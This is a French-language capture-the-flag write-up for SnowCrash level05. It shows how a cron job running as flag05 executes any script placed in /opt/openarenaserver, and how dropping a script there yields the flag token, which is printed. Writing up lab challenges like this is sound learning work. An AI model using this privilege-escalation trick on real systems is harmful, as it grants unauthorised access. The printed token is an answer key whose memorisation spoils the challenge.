rien dans le home on cherche des trucs sur -user flag05 : 
```shell
find / -user flag05 2> /dev/null
/usr/sbin/openarenaserver
/rofs/usr/sbin/openarenaserver
```

```shell
cat /usr/sbin/openarenaserver 
#!/bin/sh

for i in /opt/openarenaserver/* ; do
        (ulimit -t 5; bash -x "$i")
        rm -f "$i"
done
```
Ca ressemble a un programe lancer par CRON.

on peut faire l'essais suivant:
```shell
touch /opt/openarenaserver/essais
chmod 755 /opt/openarenaserver/essais
```
au bout de 2 mn le fichier a disparu...

On va creer un fichier run qui execute getflag et renvoi le token dans un repertoire. le seul ou l'on peut écrire est /tmp

```shell
echo 'getflag > /tmp/token' > /opt/openarenaserver/run
chmod 755 /opt/openarenaserver/run
```
apres 2 minutes notre run a ecrit dans /tmp: 
```shell
cat /tmp/token
Check flag.Here is your token : viuaaale9huek52boumoomioc
```
Check flag.Here is your token : viuaaale9huek52boumoomioc

note1:

On peut aussi envoyer le message a level05 par:
```shell
echo 'getflag | write level05' > /opt/openarenaserver/run
```
et attendre de recevoir le message 1

note2:

A la connexion on a un mouveau mail. En allant dans /var/mail on peut regarde dans le fichier level05:
```shell
level05@SnowCrash:~$ ls -l /var/mail
total 4
-rw-r--r--+ 1 root mail 58 May  2 13:51 level05
level05@SnowCrash:~$ cat /var/mail/level05
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```
e fichier "level05" dans votre boîte aux lettres contient une entrée de la crontab (table de planification des tâches) pour l'utilisateur "flag05". Cette entrée de crontab indique que toutes les deux minutes (toutes les 2 minutes), le script "/usr/sbin/openarenaserver" doit être exécuté avec les privilèges de l'utilisateur "flag05".